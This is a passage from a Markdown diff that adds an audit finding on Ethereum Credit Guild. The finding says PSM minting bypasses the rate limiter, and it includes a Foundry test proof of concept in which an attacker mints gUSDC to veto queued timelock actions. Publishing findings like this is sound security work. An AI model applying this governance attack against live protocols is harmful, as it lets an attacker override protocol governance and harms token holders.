@@ -203,3 +203,156 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 3. [Medium] RateLimitedMinter isn’t used by SimplePSM resulting in Governance attacks
+
+### Use rate limiter to mint or burn token
+
+- Summary: ProfitManager and SimplePSM contracts don't use rate limiter so that the `RateLimitedMinter` buffer is never replenished. Attacker mints gUSDC tokens in the PSM contract without rate limiter, then using them to take malicious voting action in GuildVetoGovernor and cancel actions in the queue quickly without any consequences, because `ProfitManager.creditMultiplier` doesn’t decline.
+
+- Impact & Recommendation: Use rate limiter across all contracts in the protocol when minting or burning Credit and Guild tokens.
+  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/335) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    // SPDX-License-Identifier: GPL-3.0-or-later
+    pragma solidity 0.8.13;
+    import {Test} from "@forge-std/Test.sol";
+    import {Core} from "@src/core/Core.sol";
+    import {CoreRoles} from "@src/core/CoreRoles.sol";
+    import {MockERC20} from "@test/mock/MockERC20.sol";
+    import {SimplePSM} from "@src/loan/SimplePSM.sol";
+    import {GuildToken} from "@src/tokens/GuildToken.sol";
+    import {CreditToken} from "@src/tokens/CreditToken.sol";
+    import {ProfitManager} from "@src/governance/ProfitManager.sol";
+    import {ProfitManager} from "@src/governance/ProfitManager.sol";
+    import {MockLendingTerm} from "@test/mock/MockLendingTerm.sol";
+    import {IGovernor} from "@openzeppelin/contracts/governance/IGovernor.sol";
+    import {GuildVetoGovernor} from "@src/governance/GuildVetoGovernor.sol";
+    import {GuildTimelockController} from "@src/governance/GuildTimelockController.sol";
+    import "@forge-std/console.sol";
+    contract Poc4 is Test {
+        Core private core;
+        ProfitManager private profitManager;
+        CreditToken credit;
+        GuildToken guild;
+        MockERC20 private pegToken;
+        SimplePSM private psm;
+        uint256 private constant _TIMELOCK_MIN_DELAY = 12345;
+        GuildTimelockController private timelock;
+        GuildVetoGovernor private vetoGovernor;
+        uint256 __lastCallValue = 0;
+        // From deployment script!
+
+        uint256 private constant _VETO_QUORUM = 5_000_000e18;
+        function setUp() public {
+            vm.warp(1679067867);
+            vm.roll(16848497);
+            core = new Core();
+            profitManager = new ProfitManager(address(core));
+            credit = new CreditToken(address(core), "gUSDC", "gUSDC");
+            guild = new GuildToken(address(core), address(profitManager));
+            pegToken = new MockERC20(); // USDC
+            pegToken.setDecimals(6);
+            psm = new SimplePSM(
+                address(core),
+                address(profitManager),
+                address(credit),
+                address(pegToken)
+            );
+            timelock = new GuildTimelockController(
+                address(core),
+                _TIMELOCK_MIN_DELAY
+            );
+            // VetoGovernor for gUSDC
+            vetoGovernor = new GuildVetoGovernor(
+                address(core),
+                address(timelock),
+                address(credit),
+                _VETO_QUORUM // 5Mil gUSDC
+            );
+            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
+            core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
+            core.grantRole(CoreRoles.CREDIT_GOVERNANCE_PARAMETERS, address(this));
+            core.createRole(CoreRoles.TIMELOCK_EXECUTOR, CoreRoles.GOVERNOR);
+            core.grantRole(CoreRoles.TIMELOCK_EXECUTOR, address(0));
+            core.createRole(CoreRoles.TIMELOCK_CANCELLER, CoreRoles.GOVERNOR);
+            core.grantRole(CoreRoles.TIMELOCK_CANCELLER, address(vetoGovernor));
+            core.createRole(CoreRoles.TIMELOCK_PROPOSER, CoreRoles.GOVERNOR);
+            core.grantRole(CoreRoles.TIMELOCK_PROPOSER, address(this));
+            core.renounceRole(CoreRoles.GOVERNOR, address(this));
+            credit.setMaxDelegates(1);
+        }
+        function __dummyCall(uint256 val) external {
+            __lastCallValue = val;
+        }
+        function _queueDummyTimelockAction(
+            uint256 number
+        ) internal returns (bytes32) {
+            address[] memory targets = new address[](1);
+            targets[0] = address(this);
+            uint256[] memory values = new uint256[](1);
+            bytes[] memory payloads = new bytes[](1);
+            payloads[0] = abi.encodeWithSelector(
+                Poc4.__dummyCall.selector,
+                number
+            );
+            bytes32 predecessor = bytes32(0);
+            bytes32 salt = keccak256(bytes("dummy call"));
+            timelock.scheduleBatch(
+                targets,
+                values,
+                payloads,
+                predecessor,
+                salt,
+                _TIMELOCK_MIN_DELAY
+            );
+            bytes32 timelockId = timelock.hashOperationBatch(
+                targets,
+                values,
+                payloads,
+                0,
+                salt
+            );
+            return timelockId;
+        }
+        function test_poc() public {
+            address Alice = address(100);
+            // Schedule an action in the timelock, Alice will veto it.
+            bytes32 timelockId = _queueDummyTimelockAction(12345);
+            // Afluent Alice has 6Mil of USDC and mints gUSDC in PSM
+            // PSM isn't rate-limited (there is no cap)!
+            pegToken.mint(Alice, 6_000_000e6);
+            vm.startPrank(Alice);
+            pegToken.approve(address(psm), 6_000_000e6);
+            psm.mint(Alice, 6_000_000e6);
+
+            // Alice has enough voting power!
+            require(credit.balanceOf(Alice) > vetoGovernor.quorum(0));
+            credit.delegate(Alice);
+            // Alice creates a Veto proposal
+            uint256 proposalId = vetoGovernor.createVeto(timelockId);
+            vm.roll(block.number + 1);
+            vm.warp(block.timestamp + 10);
+            // Alice cast a vote against
+            vetoGovernor.castVote(proposalId, uint8(GuildVetoGovernor.VoteType.Against));
+            vm.roll(block.number + 1);
+            vm.warp(block.timestamp + 10);
+            (
+                uint256 againstVotes,
+                uint256 forVotes,
+                uint256 abstainVotes
+            ) = vetoGovernor.proposalVotes(
+                proposalId
+            );
+            // There is a Quorum, Alice can execute Veto proposal
+            require(againstVotes > vetoGovernor.quorum(0));
+            vetoGovernor.executeVeto(timelockId);
+            vm.stopPrank();
+        }
+    }
+
+  ```
+
+  </details>
